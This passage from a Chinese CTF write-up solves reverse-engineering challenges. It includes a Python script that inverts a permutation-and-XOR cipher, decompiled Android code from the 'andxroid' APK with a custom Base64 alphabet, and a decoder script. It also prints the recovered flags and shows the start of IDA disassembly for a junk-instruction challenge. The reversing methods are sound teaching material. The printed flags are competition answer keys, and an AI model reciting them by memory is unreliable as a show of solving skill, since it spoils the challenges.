    0x78, 0x94, 0xF8, 0x69, 0xC8, 0x3A, 0x20, 0xDC, 0x1E, 0xB1,
    # 0x40EE (10字节)
    0xCE, 0xCA, 0x43, 0xEB, 0x9D, 0x15, 0x92, 0xE3, 0x04, 0x77,
    # 0x40F8 (10字节)
    0x33, 0x48, 0xA5, 0x91, 0xC1, 0x8D, 0xCF, 0xAC, 0x96, 0xBC,
    # 0x4102 (11字节)
    0x83, 0x1A, 0x1D, 0xC2, 0x7B, 0x02, 0x75, 0x12, 0x5A, 0xF0, 0x0A,
    # 0x410D (10字节)
    0xDB, 0xB8, 0x4E, 0xC4, 0xBA, 0x42, 0x6F, 0x3D, 0x76, 0xCB,
    # 0x4117 (11字节)
    0x6B, 0x32, 0xAF, 0x40, 0xFC, 0x59, 0x52, 0x85, 0xDF, 0x07, 0x4B,
    # 0x4122 (10字节)
    0xB3, 0x36, 0xE0, 0x1C, 0x63, 0x8C, 0x29, 0x9A, 0x6D, 0xC3,
    # 0x412C (10字节)
    0x70, 0x6C, 0xF6, 0x45, 0x0D, 0x13, 0x35, 0x97, 0x8B, 0xD0,
    # 0x4136 (10字节)
    0x56, 0x46, 0x0B, 0x8E, 0x44, 0xBE, 0x68, 0x4D, 0x21, 0xBB,
    # 0x4140 (11字节)
    0x81, 0x24, 0x30, 0x2F, 0xA9, 0xBF, 0x95, 0xA8, 0x2D, 0x01, 0x88,
    # 0x414B (10字节)
    0xF9, 0x7A, 0xD7, 0xAA, 0xA7, 0xE1, 0x05, 0x19, 0x65, 0x22,
    # 0x4155 (11字节) → 累计256字节
    0x55, 0x18, 0x98, 0xAE, 0x17, 0x84, 0x00, 0xE4, 0x67, 0xEE, 0x2C
]

# 正确的ciphertext数组（前34字节，对应j=0~33）
ciphertext = [
    # 0x4030 (11字节)
    0x5C, 0x80, 0xF3, 0x08, 0x14, 0x54, 0xEA, 0x0D, 0x67, 0x45, 0x78,
    # 0x403B (10字节)
    0x77, 0xC4, 0x8E, 0x1D, 0x1B, 0x37, 0x49, 0x23, 0x4C, 0xB5,
    # 0x4045 (10字节)
    0xB2, 0x81, 0x8B, 0x92, 0x69, 0x83, 0x59, 0xCB, 0x91, 0x3C,
    # 0x404F (3字节，补足34)
    0x9B, 0xB9, 0x1F
]

# 验证数据长度（确保绝对正确）
assert len(table) == 256, f"table长度错误：{len(table)}字节（需256）"
assert len(ciphertext) == 34, f"ciphertext长度错误：{len(ciphertext)}字节（需34）"

# 构建table的逆置换（核心逻辑：table[i] = v → inv_table[v] = i）
inv_table = [0] * 256
for i in range(256):
    val = table[i]
    inv_table[val] = i  # 置换唯一，无冲突

# 逆向计算flag（严格遵循原代码逻辑）
flag = []
for j in range(34):
    # 1. 取当前ciphertext值
    c = ciphertext[j]
    # 2. 逆置换得到 x = (17*j +13) ^ s[j]
    x = inv_table[c]
    # 3. 计算密钥：17*j +13（无溢出，因j最大33，17*33+13=574，模256后为574-2*256=62）
    key = (17 * j + 13) & 0xFF  # 强制unsigned __int8，与原代码一致
    # 4. 异或可逆：s[j] = key ^ x
    char_code = key ^ x
    # 5. 转换为字符（CTF flag必为可见ASCII，此处无需过滤）
    flag.append(chr(char_code))

# 拼接并输出最终flag
flag_str = ''.join(flag)
print(f"最终正确Flag: {flag_str}")
```

运行解密脚本

```cmd
C:\Users\probie\Desktop\writeup\abc>python payload.py
最终正确Flag: XSWCTF{Thi3_i3_7he_s0_c@11ed_abcd}
```

**得到：**XSWCTF{Thi3_i3_7he_s0_c@11ed_abcd}



### andxroid

#### 解题过程

下载得到`andxroid.apk`直接扔进`Jadx`里看源码

找一下看到两个主要的类

```java
package com.challenge.andxroid;

import android.os.Bundle;
import android.widget.Toast;
import androidx.activity.ComponentActivity;
import androidx.activity.compose.ComponentActivityKt;
import androidx.compose.foundation.layout.SizeKt;
import androidx.compose.material3.MaterialTheme;
import androidx.compose.material3.SurfaceKt;
import androidx.compose.runtime.Composer;
import androidx.compose.runtime.ComposerKt;
import androidx.compose.runtime.internal.ComposableLambdaKt;
import androidx.compose.ui.Modifier;
import com.challenge.andxroid.ui.theme.ThemeKt;
import kotlin.Metadata;
import kotlin.Unit;
import kotlin.jvm.functions.Function1;
import kotlin.jvm.functions.Function2;
import kotlin.jvm.internal.Intrinsics;

/* compiled from: MainActivity.kt */
@Metadata(d1 = {"\u0000\u0018\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\b\u0007\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\u0012\u0010\u0003\u001a\u00020\u00042\b\u0010\u0005\u001a\u0004\u0018\u00010\u0006H\u0014¨\u0006\u0007"}, d2 = {"Lcom/challenge/andxroid/MainActivity;", "Landroidx/activity/ComponentActivity;", "()V", "onCreate", "", "savedInstanceState", "Landroid/os/Bundle;", "app_release"}, k = 1, mv = {1, 8, 0}, xi = 48)
/* loaded from: classes.dex */
public final class MainActivity extends ComponentActivity {
    public static final int $stable = 0;

    @Override // androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ComponentActivityKt.setContent$default(this, null, ComposableLambdaKt.composableLambdaInstance(-1534968847, true, new Function2<Composer, Integer, Unit>() { // from class: com.challenge.andxroid.MainActivity.onCreate.1
            {
                super(2);
            }

            @Override // kotlin.jvm.functions.Function2
            public /* bridge */ /* synthetic */ Unit invoke(Composer composer, Integer num) {
                invoke(composer, num.intValue());
                return Unit.INSTANCE;
            }

            public final void invoke(Composer composer, int i) {
                if ((i & 11) != 2 || !composer.getSkipping()) {
                    if (ComposerKt.isTraceInProgress()) {
                        ComposerKt.traceEventStart(-1534968847, i, -1, "com.challenge.andxroid.MainActivity.onCreate.<anonymous> (MainActivity.kt:18)");
                    }
                    final MainActivity mainActivity = MainActivity.this;
                    ThemeKt.AndxroidTheme(false, false, ComposableLambdaKt.composableLambda(composer, 1002544052, true, new Function2<Composer, Integer, Unit>() { // from class: com.challenge.andxroid.MainActivity.onCreate.1.1
                        {
                            super(2);
                        }

                        @Override // kotlin.jvm.functions.Function2
                        public /* bridge */ /* synthetic */ Unit invoke(Composer composer2, Integer num) {
                            invoke(composer2, num.intValue());
                            return Unit.INSTANCE;
                        }

                        public final void invoke(Composer composer2, int i2) {
                            if ((i2 & 11) != 2 || !composer2.getSkipping()) {
                                if (ComposerKt.isTraceInProgress()) {
                                    ComposerKt.traceEventStart(1002544052, i2, -1, "com.challenge.andxroid.MainActivity.onCreate.<anonymous>.<anonymous> (MainActivity.kt:19)");
                                }
                                Modifier modifierFillMaxSize$default = SizeKt.fillMaxSize$default(Modifier.INSTANCE, 0.0f, 1, null);
                                long jM958getBackground0d7_KjU = MaterialTheme.INSTANCE.getColorScheme(composer2, MaterialTheme.$stable).m958getBackground0d7_KjU();
                                final MainActivity mainActivity2 = mainActivity;
                                SurfaceKt.m1245SurfaceT9BRK9s(modifierFillMaxSize$default, null, jM958getBackground0d7_KjU, 0L, 0.0f, 0.0f, null, ComposableLambdaKt.composableLambda(composer2, -707271559, true, new Function2<Composer, Integer, Unit>() { // from class: com.challenge.andxroid.MainActivity.onCreate.1.1.1
                                    {
                                        super(2);
                                    }

                                    @Override // kotlin.jvm.functions.Function2
                                    public /* bridge */ /* synthetic */ Unit invoke(Composer composer3, Integer num) {
                                        invoke(composer3, num.intValue());
                                        return Unit.INSTANCE;
                                    }

                                    public final void invoke(Composer composer3, int i3) {
                                        if ((i3 & 11) == 2 && composer3.getSkipping()) {
                                            composer3.skipToGroupEnd();
                                            return;
                                        }
                                        if (ComposerKt.isTraceInProgress()) {
                                            ComposerKt.traceEventStart(-707271559, i3, -1, "com.challenge.andxroid.MainActivity.onCreate.<anonymous>.<anonymous>.<anonymous> (MainActivity.kt:23)");
                                        }
                                        final MainActivity mainActivity3 = mainActivity2;
                                        composer3.startReplaceableGroup(1157296644);
                                        ComposerKt.sourceInformation(composer3, "CC(remember)P(1):Composables.kt#9igjgp");
                                        boolean zChanged = composer3.changed(mainActivity3);
                                        Object objRememberedValue = composer3.rememberedValue();
                                        if (zChanged || objRememberedValue == Composer.INSTANCE.getEmpty()) {
                                            objRememberedValue = (Function1) new Function1<String, Unit>() { // from class: com.challenge.andxroid.MainActivity$onCreate$1$1$1$1$1
                                                {
                                                    super(1);
                                                }

                                                @Override // kotlin.jvm.functions.Function1
                                                public /* bridge */ /* synthetic */ Unit invoke(String str) {
                                                    invoke2(str);
                                                    return Unit.INSTANCE;
                                                }

                                                /* renamed from: invoke, reason: avoid collision after fix types in other method */
                                                public final void invoke2(String result) {
                                                    Intrinsics.checkNotNullParameter(result, "result");
                                                    Toast.makeText(mainActivity3, result, 1).show();
                                                }
                                            };
                                            composer3.updateRememberedValue(objRememberedValue);
                                        }
                                        composer3.endReplaceableGroup();
                                        MainActivityKt.FlagCheckUI((Function1) objRememberedValue, composer3, 0);
                                        if (ComposerKt.isTraceInProgress()) {
                                            ComposerKt.traceEventEnd();
                                        }
                                    }
                                }), composer2, 12582918, 122);
                                if (ComposerKt.isTraceInProgress()) {
                                    ComposerKt.traceEventEnd();
                                    return;
                                }
                                return;
                            }
                            composer2.skipToGroupEnd();
                        }
                    }), composer, 384, 3);
                    if (ComposerKt.isTraceInProgress()) {
                        ComposerKt.traceEventEnd();
                        return;
                    }
                    return;
                }
                composer.skipToGroupEnd();
            }
        }), 1, null);
    }
}
```

```java
package com.challenge.andxroid;

import androidx.compose.foundation.interaction.MutableInteractionSource;
import androidx.compose.foundation.layout.Arrangement;
import androidx.compose.foundation.layout.ColumnKt;
import androidx.compose.foundation.layout.ColumnScopeInstance;
import androidx.compose.foundation.layout.PaddingKt;
import androidx.compose.foundation.layout.SizeKt;
import androidx.compose.foundation.layout.SpacerKt;
import androidx.compose.foundation.text.KeyboardActions;
import androidx.compose.foundation.text.KeyboardOptions;
import androidx.compose.material3.ButtonKt;
import androidx.compose.material3.MaterialTheme;
import androidx.compose.material3.TextFieldColors;
import androidx.compose.material3.TextFieldKt;
import androidx.compose.material3.TextKt;
import androidx.compose.runtime.Applier;
import androidx.compose.runtime.ComposablesKt;
import androidx.compose.runtime.Composer;
import androidx.compose.runtime.ComposerKt;
import androidx.compose.runtime.MutableState;
import androidx.compose.runtime.ProvidableCompositionLocal;
import androidx.compose.runtime.RecomposeScopeImplKt;
import androidx.compose.runtime.ScopeUpdateScope;
import androidx.compose.runtime.SkippableUpdater;
import androidx.compose.runtime.SnapshotStateKt__SnapshotStateKt;
import androidx.compose.runtime.Updater;
import androidx.compose.ui.Alignment;
import androidx.compose.ui.Modifier;
import androidx.compose.ui.graphics.Shape;
import androidx.compose.ui.layout.LayoutKt;
import androidx.compose.ui.layout.MeasurePolicy;
import androidx.compose.ui.node.ComposeUiNode;
import androidx.compose.ui.platform.CompositionLocalsKt;
import androidx.compose.ui.platform.ViewConfiguration;
import androidx.compose.ui.text.TextStyle;
import androidx.compose.ui.text.input.VisualTransformation;
import androidx.compose.ui.unit.Density;
import androidx.compose.ui.unit.Dp;
import androidx.compose.ui.unit.LayoutDirection;
import com.challenge.andxroid.ui.theme.ThemeKt;
import java.util.Base64;
import kotlin.Metadata;
import kotlin.Unit;
import kotlin.jvm.functions.Function0;
import kotlin.jvm.functions.Function1;
import kotlin.jvm.functions.Function2;
import kotlin.jvm.functions.Function3;
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.Charsets;
import kotlin.text.StringsKt;

/* compiled from: MainActivity.kt */
@Metadata(d1 = {"\u0000*\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u000b\n\u0002\b\u0002\n\u0002\u0010\u0012\n\u0002\b\u0003\u001a\r\u0010\u0003\u001a\u00020\u0004H\u0007¢\u0006\u0002\u0010\u0005\u001a!\u0010\u0006\u001a\u00020\u00042\u0012\u0010\u0007\u001a\u000e\u0012\u0004\u0012\u00020\u0001\u0012\u0004\u0012\u00020\u00040\bH\u0007¢\u0006\u0002\u0010\t\u001a\u000e\u0010\n\u001a\u00020\u000b2\u0006\u0010\f\u001a\u00020\u0001\u001a\u000e\u0010\r\u001a\u00020\u000e2\u0006\u0010\u000f\u001a\u00020\u0001\u001a\u000e\u0010\u0010\u001a\u00020\u00012\u0006\u0010\u000f\u001a\u00020\u000e\"\u000e\u0010\u0000\u001a\u00020\u0001X\u0082T¢\u0006\u0002\n\u0000\"\u000e\u0010\u0002\u001a\u00020\u0001X\u0082T¢\u0006\u0002\n\u0000¨\u0006\u0011"}, d2 = {"CUSTOM_BASE64_TABLE", "", "STANDARD_BASE64_TABLE", "FlagCheckPreview", "", "(Landroidx/compose/runtime/Composer;I)V", "FlagCheckUI", "onResult", "Lkotlin/Function1;", "(Lkotlin/jvm/functions/Function1;Landroidx/compose/runtime/Composer;I)V", "checkFlag", "", "flag", "customBase64Decode", "", "input", "customBase64Encode", "app_release"}, k = 2, mv = {1, 8, 0}, xi = 48)
/* loaded from: classes.dex */
public final class MainActivityKt {
    private static final String CUSTOM_BASE64_TABLE = "QWErtyuiopASDFGHJKLZXCVBNM1234567890qwertYUIOPasdfghjklzxcvbnm+/";
    private static final String STANDARD_BASE64_TABLE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    public static final String customBase64Encode(byte[] input) {
        Intrinsics.checkNotNullParameter(input, "input");
        String standardEncoded = Base64.getEncoder().encodeToString(input);
        StringBuilder sb = new StringBuilder();
        Intrinsics.checkNotNullExpressionValue(standardEncoded, "standardEncoded");
        int length = standardEncoded.length();
        for (int i = 0; i < length; i++) {
            char cCharAt = standardEncoded.charAt(i);
            int iIndexOf$default = StringsKt.indexOf$default((CharSequence) STANDARD_BASE64_TABLE, cCharAt, 0, false, 6, (Object) null);
            if (iIndexOf$default != -1) {
                cCharAt = CUSTOM_BASE64_TABLE.charAt(iIndexOf$default);
            }
            sb.append(cCharAt);
        }
        String string = sb.toString();
        Intrinsics.checkNotNullExpressionValue(string, "sb.toString()");
        return string;
    }

    public static final byte[] customBase64Decode(String input) {
        Intrinsics.checkNotNullParameter(input, "input");
        StringBuilder sb = new StringBuilder();
        int length = input.length();
        for (int i = 0; i < length; i++) {
            char cCharAt = input.charAt(i);
            int iIndexOf$default = StringsKt.indexOf$default((CharSequence) CUSTOM_BASE64_TABLE, cCharAt, 0, false, 6, (Object) null);
            if (iIndexOf$default != -1) {
                cCharAt = STANDARD_BASE64_TABLE.charAt(iIndexOf$default);
            }
            sb.append(cCharAt);
        }
        byte[] bArrDecode = Base64.getDecoder().decode(sb.toString());
        Intrinsics.checkNotNullExpressionValue(bArrDecode, "getDecoder().decode(sb.toString())");
        return bArrDecode;
    }

    public static final boolean checkFlag(String flag) {
        Intrinsics.checkNotNullParameter(flag, "flag");
        byte[] bytes = flag.getBytes(Charsets.UTF_8);
        Intrinsics.checkNotNullExpressionValue(bytes, "getBytes(...)");
        return Intrinsics.areEqual("VyFBJkKu5zoh40Fg3hF6NVcq30WYMyng2hok6J==", customBase64Encode(bytes));
    }

    public static final void FlagCheckUI(final Function1<? super String, Unit> onResult, Composer composer, final int i) {
        int i2;
        Composer composer2;
        Intrinsics.checkNotNullParameter(onResult, "onResult");
        Composer composerStartRestartGroup = composer.startRestartGroup(2139476518);
        ComposerKt.sourceInformation(composerStartRestartGroup, "C(FlagCheckUI)");
        if ((i & 14) == 0) {
            i2 = (composerStartRestartGroup.changedInstance(onResult) ? 4 : 2) | i;
        } else {
            i2 = i;
        }
        if ((i2 & 11) != 2 || !composerStartRestartGroup.getSkipping()) {
            if (ComposerKt.isTraceInProgress()) {
                ComposerKt.traceEventStart(2139476518, i2, -1, "com.challenge.andxroid.FlagCheckUI (MainActivity.kt:63)");
            }
            composerStartRestartGroup.startReplaceableGroup(-492369756);
            ComposerKt.sourceInformation(composerStartRestartGroup, "CC(remember):Composables.kt#9igjgp");
            Object objRememberedValue = composerStartRestartGroup.rememberedValue();
            if (objRememberedValue == Composer.INSTANCE.getEmpty()) {
                objRememberedValue = SnapshotStateKt__SnapshotStateKt.mutableStateOf$default("", null, 2, null);
                composerStartRestartGroup.updateRememberedValue(objRememberedValue);
            }
            composerStartRestartGroup.endReplaceableGroup();
            final MutableState mutableState = (MutableState) objRememberedValue;
            composerStartRestartGroup.startReplaceableGroup(-492369756);
            ComposerKt.sourceInformation(composerStartRestartGroup, "CC(remember):Composables.kt#9igjgp");
            Object objRememberedValue2 = composerStartRestartGroup.rememberedValue();
            if (objRememberedValue2 == Composer.INSTANCE.getEmpty()) {
                objRememberedValue2 = SnapshotStateKt__SnapshotStateKt.mutableStateOf$default("", null, 2, null);
                composerStartRestartGroup.updateRememberedValue(objRememberedValue2);
            }
            composerStartRestartGroup.endReplaceableGroup();
            final MutableState mutableState2 = (MutableState) objRememberedValue2;
            Modifier modifierM414padding3ABfNKs = PaddingKt.m414padding3ABfNKs(SizeKt.fillMaxSize$default(Modifier.INSTANCE, 0.0f, 1, null), Dp.m4780constructorimpl(32));
            Arrangement.HorizontalOrVertical center = Arrangement.INSTANCE.getCenter();
            composerStartRestartGroup.startReplaceableGroup(-483455358);
            ComposerKt.sourceInformation(composerStartRestartGroup, "CC(Column)P(2,3,1)77@3913L61,78@3979L133:Column.kt#2w3rfo");
            MeasurePolicy measurePolicyColumnMeasurePolicy = ColumnKt.columnMeasurePolicy(center, Alignment.INSTANCE.getStart(), composerStartRestartGroup, 6);
            composerStartRestartGroup.startReplaceableGroup(-1323940314);
            ComposerKt.sourceInformation(composerStartRestartGroup, "C(Layout)P(!1,2)74@2915L7,75@2970L7,76@3029L7,77@3041L460:Layout.kt#80mrfh");
            ProvidableCompositionLocal<Density> localDensity = CompositionLocalsKt.getLocalDensity();
            ComposerKt.sourceInformationMarkerStart(composerStartRestartGroup, 2023513938, "C:CompositionLocal.kt#9igjgp");
            Object objConsume = composerStartRestartGroup.consume(localDensity);
            ComposerKt.sourceInformationMarkerEnd(composerStartRestartGroup);
            Density density = (Density) objConsume;
            ProvidableCompositionLocal<LayoutDirection> localLayoutDirection = CompositionLocalsKt.getLocalLayoutDirection();
            ComposerKt.sourceInformationMarkerStart(composerStartRestartGroup, 2023513938, "C:CompositionLocal.kt#9igjgp");
            Object objConsume2 = composerStartRestartGroup.consume(localLayoutDirection);
            ComposerKt.sourceInformationMarkerEnd(composerStartRestartGroup);
            LayoutDirection layoutDirection = (LayoutDirection) objConsume2;
            ProvidableCompositionLocal<ViewConfiguration> localViewConfiguration = CompositionLocalsKt.getLocalViewConfiguration();
            ComposerKt.sourceInformationMarkerStart(composerStartRestartGroup, 2023513938, "C:CompositionLocal.kt#9igjgp");
            Object objConsume3 = composerStartRestartGroup.consume(localViewConfiguration);
            ComposerKt.sourceInformationMarkerEnd(composerStartRestartGroup);
            ViewConfiguration viewConfiguration = (ViewConfiguration) objConsume3;
            Function0<ComposeUiNode> constructor = ComposeUiNode.INSTANCE.getConstructor();
            Function3<SkippableUpdater<ComposeUiNode>, Composer, Integer, Unit> function3MaterializerOf = LayoutKt.materializerOf(modifierM414padding3ABfNKs);
            if (!(composerStartRestartGroup.getApplier() instanceof Applier)) {
                ComposablesKt.invalidApplier();
            }
            composerStartRestartGroup.startReusableNode();
            if (composerStartRestartGroup.getInserting()) {
                composerStartRestartGroup.createNode(constructor);
            } else {
                composerStartRestartGroup.useNode();
            }
            composerStartRestartGroup.disableReusing();
            Composer composerM1927constructorimpl = Updater.m1927constructorimpl(composerStartRestartGroup);
            Updater.m1934setimpl(composerM1927constructorimpl, measurePolicyColumnMeasurePolicy, ComposeUiNode.INSTANCE.getSetMeasurePolicy());
            Updater.m1934setimpl(composerM1927constructorimpl, density, ComposeUiNode.INSTANCE.getSetDensity());
            Updater.m1934setimpl(composerM1927constructorimpl, layoutDirection, ComposeUiNode.INSTANCE.getSetLayoutDirection());
            Updater.m1934setimpl(composerM1927constructorimpl, viewConfiguration, ComposeUiNode.INSTANCE.getSetViewConfiguration());
            composerStartRestartGroup.enableReusing();
            function3MaterializerOf.invoke(SkippableUpdater.m1918boximpl(SkippableUpdater.m1919constructorimpl(composerStartRestartGroup)), composerStartRestartGroup, 0);
            composerStartRestartGroup.startReplaceableGroup(2058660585);
            ComposerKt.sourceInformationMarkerStart(composerStartRestartGroup, 276693704, "C79@4027L9:Column.kt#2w3rfo");
            ColumnScopeInstance columnScopeInstance = ColumnScopeInstance.INSTANCE;
            composer2 = composerStartRestartGroup;
            TextKt.m1320TextfLXpl1I("请输入你的flag:", null, 0L, 0L, null, null, null, 0L, null, null, 0L, 0, false, 0, null, MaterialTheme.INSTANCE.getTypography(composerStartRestartGroup, MaterialTheme.$stable).getTitleMedium(), composerStartRestartGroup, 6, 0, 32766);
            float f = 16;
            SpacerKt.Spacer(SizeKt.m443height3ABfNKs(Modifier.INSTANCE, Dp.m4780constructorimpl(f)), composer2, 6);
            String strFlagCheckUI$lambda$1 = FlagCheckUI$lambda$1(mutableState);
            Modifier modifierFillMaxWidth$default = SizeKt.fillMaxWidth$default(Modifier.INSTANCE, 0.0f, 1, null);
            composer2.startReplaceableGroup(1157296644);
            ComposerKt.sourceInformation(composer2, "CC(remember)P(1):Composables.kt#9igjgp");
            boolean zChanged = composer2.changed(mutableState);
            Object objRememberedValue3 = composer2.rememberedValue();
            if (zChanged || objRememberedValue3 == Composer.INSTANCE.getEmpty()) {
                objRememberedValue3 = (Function1) new Function1<String, Unit>() { // from class: com.challenge.andxroid.MainActivityKt$FlagCheckUI$1$1$1
                    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                    {
                        super(1);
                    }

                    @Override // kotlin.jvm.functions.Function1
                    public /* bridge */ /* synthetic */ Unit invoke(String str) {
                        invoke2(str);
                        return Unit.INSTANCE;
                    }

                    /* renamed from: invoke, reason: avoid collision after fix types in other method */
                    public final void invoke2(String it) {
                        Intrinsics.checkNotNullParameter(it, "it");
                        mutableState.setValue(it);
                    }
                };
                composer2.updateRememberedValue(objRememberedValue3);
            }
            composer2.endReplaceableGroup();
            TextFieldKt.TextField(strFlagCheckUI$lambda$1, (Function1<? super String, Unit>) objRememberedValue3, modifierFillMaxWidth$default, false, false, (TextStyle) null, (Function2<? super Composer, ? super Integer, Unit>) ComposableSingletons$MainActivityKt.INSTANCE.m5193getLambda1$app_release(), (Function2<? super Composer, ? super Integer, Unit>) null, (Function2<? super Composer, ? super Integer, Unit>) null, (Function2<? super Composer, ? super Integer, Unit>) null, (Function2<? super Composer, ? super Integer, Unit>) null, false, (VisualTransformation) null, (KeyboardOptions) null, (KeyboardActions) null, false, 0, (MutableInteractionSource) null, (Shape) null, (TextFieldColors) null, composer2, 1573248, 0, 1048504);
            SpacerKt.Spacer(SizeKt.m443height3ABfNKs(Modifier.INSTANCE, Dp.m4780constructorimpl(f)), composer2, 6);
            composer2.startReplaceableGroup(1618982084);
            ComposerKt.sourceInformation(composer2, "CC(remember)P(1,2,3):Composables.kt#9igjgp");
            boolean zChanged2 = composer2.changed(mutableState) | composer2.changed(mutableState2) | composer2.changed(onResult);
            Object objRememberedValue4 = composer2.rememberedValue();
            if (zChanged2 || objRememberedValue4 == Composer.INSTANCE.getEmpty()) {
                objRememberedValue4 = (Function0) new Function0<Unit>() { // from class: com.challenge.andxroid.MainActivityKt$FlagCheckUI$1$2$1
                    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                    /* JADX WARN: Multi-variable type inference failed */
                    {
                        super(0);
                    }

                    @Override // kotlin.jvm.functions.Function0
                    public /* bridge */ /* synthetic */ Unit invoke() {
                        invoke2();
                        return Unit.INSTANCE;
                    }

                    /* renamed from: invoke, reason: avoid collision after fix types in other method */
                    public final void invoke2() {
                        mutableState2.setValue(MainActivityKt.checkFlag(MainActivityKt.FlagCheckUI$lambda$1(mutableState)) ? "恭喜，你的flag正确！" : "很遗憾，flag错误。");
                        onResult.invoke(MainActivityKt.FlagCheckUI$lambda$4(mutableState2));
                    }
                };
                composer2.updateRememberedValue(objRememberedValue4);
            }
            composer2.endReplaceableGroup();
            ButtonKt.Button((Function0) objRememberedValue4, SizeKt.fillMaxWidth$default(Modifier.INSTANCE, 0.0f, 1, null), false, null, null, null, null, null, null, ComposableSingletons$MainActivityKt.INSTANCE.m5194getLambda2$app_release(), composer2, 805306416, 508);
            SpacerKt.Spacer(SizeKt.m443height3ABfNKs(Modifier.INSTANCE, Dp.m4780constructorimpl(f)), composer2, 6);
            TextKt.m1320TextfLXpl1I(FlagCheckUI$lambda$4(mutableState2), null, 0L, 0L, null, null, null, 0L, null, null, 0L, 0, false, 0, null, MaterialTheme.INSTANCE.getTypography(composer2, MaterialTheme.$stable).getBodyLarge(), composer2, 0, 0, 32766);
            ComposerKt.sourceInformationMarkerEnd(composer2);
            composer2.endReplaceableGroup();
            composer2.endNode();
            composer2.endReplaceableGroup();
            composer2.endReplaceableGroup();
            if (ComposerKt.isTraceInProgress()) {
                ComposerKt.traceEventEnd();
            }
        } else {
            composerStartRestartGroup.skipToGroupEnd();
            composer2 = composerStartRestartGroup;
        }
        ScopeUpdateScope scopeUpdateScopeEndRestartGroup = composer2.endRestartGroup();
        if (scopeUpdateScopeEndRestartGroup == null) {
            return;
        }
        scopeUpdateScopeEndRestartGroup.updateScope(new Function2<Composer, Integer, Unit>() { // from class: com.challenge.andxroid.MainActivityKt.FlagCheckUI.2
            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            /* JADX WARN: Multi-variable type inference failed */
            {
                super(2);
            }

            @Override // kotlin.jvm.functions.Function2
            public /* bridge */ /* synthetic */ Unit invoke(Composer composer3, Integer num) {
                invoke(composer3, num.intValue());
                return Unit.INSTANCE;
            }

            public final void invoke(Composer composer3, int i3) {
                MainActivityKt.FlagCheckUI(onResult, composer3, RecomposeScopeImplKt.updateChangedFlags(i | 1));
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final String FlagCheckUI$lambda$1(MutableState<String> mutableState) {
        return mutableState.getValue();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final String FlagCheckUI$lambda$4(MutableState<String> mutableState) {
        return mutableState.getValue();
    }

    public static final void FlagCheckPreview(Composer composer, final int i) {
        Composer composerStartRestartGroup = composer.startRestartGroup(-60528085);
        ComposerKt.sourceInformation(composerStartRestartGroup, "C(FlagCheckPreview)");
        if (i != 0 || !composerStartRestartGroup.getSkipping()) {
            if (ComposerKt.isTraceInProgress()) {
                ComposerKt.traceEventStart(-60528085, i, -1, "com.challenge.andxroid.FlagCheckPreview (MainActivity.kt:99)");
            }
            ThemeKt.AndxroidTheme(false, false, ComposableSingletons$MainActivityKt.INSTANCE.m5195getLambda3$app_release(), composerStartRestartGroup, 384, 3);
            if (ComposerKt.isTraceInProgress()) {
                ComposerKt.traceEventEnd();
            }
        } else {
            composerStartRestartGroup.skipToGroupEnd();
        }
        ScopeUpdateScope scopeUpdateScopeEndRestartGroup = composerStartRestartGroup.endRestartGroup();
        if (scopeUpdateScopeEndRestartGroup == null) {
            return;
        }
        scopeUpdateScopeEndRestartGroup.updateScope(new Function2<Composer, Integer, Unit>() { // from class: com.challenge.andxroid.MainActivityKt.FlagCheckPreview.1
            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            {
                super(2);
            }

            @Override // kotlin.jvm.functions.Function2
            public /* bridge */ /* synthetic */ Unit invoke(Composer composer2, Integer num) {
                invoke(composer2, num.intValue());
                return Unit.INSTANCE;
            }

            public final void invoke(Composer composer2, int i2) {
                MainActivityKt.FlagCheckPreview(composer2, RecomposeScopeImplKt.updateChangedFlags(i | 1));
            }
        });
    }
}
```

这个加密过程很长，但是很简单

无非就是Base64，偏移，比较

简单写一个的解密脚本

```python
import base64

CUSTOM_BASE64_TABLE = "QWErtyuiopASDFGHJKLZXCVBNM1234567890qwertYUIOPasdfghjklzxcvbnm+/"
STANDARD_BASE64_TABLE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
target_encoded = "VyFBJkKu5zoh40Fg3hF6NVcq30WYMyng2hok6J=="

standard_encoded = []
for c in target_encoded:
    if c == '=':
        standard_encoded.append(c)
    else:
        idx = CUSTOM_BASE64_TABLE.index(c)
        standard_encoded.append(STANDARD_BASE64_TABLE[idx])
standard_encoded_str = ''.join(standard_encoded)

decoded_bytes = base64.b64decode(standard_encoded_str)

flag = decoded_bytes.decode('utf-8')

print("Base64", standard_encoded_str)
print("flag", flag)
```

运行解密脚本

```cmd
C:\Users\probie\Desktop\writeup\android>python payload.py
Base64 WFNXQ1RGe3IzdjNyczNfYW5kcjBpZF8ybzI1fQ==
flag XSWCTF{r3v3rs3_andr0id_2o25}
```

**得到：**XSWCTF{r3v3rs3_andr0id_2o25}



### ez_flower

#### 解题过程

看题目就知道又是花指令了，想到我那个ida有nop但是没有nop的快捷键，而且我也不知道怎么找怎么装nop快捷键的插件我就莫名的悲伤呜呜呜

下载解压扔进IDA看看先

```nasm
.text:00000000004018BE ; int __fastcall main(int argc, const char **argv, const char **envp)
.text:00000000004018BE main            proc near               ; CODE XREF: sub_401180+242↑p
.text:00000000004018BE                                         ; DATA XREF: .pdata:000000000040606C↓o ...
.text:00000000004018BE
.text:00000000004018BE Str1            = byte ptr -100h
.text:00000000004018BE
.text:00000000004018BE                 push    rbp
.text:00000000004018BF                 sub     rsp, 120h
.text:00000000004018C6                 lea     rbp, [rsp+80h]
.text:00000000004018CE                 call    sub_401A00
.text:00000000004018D3                 lea     rcx, Buffer     ; "plz input your flag:"
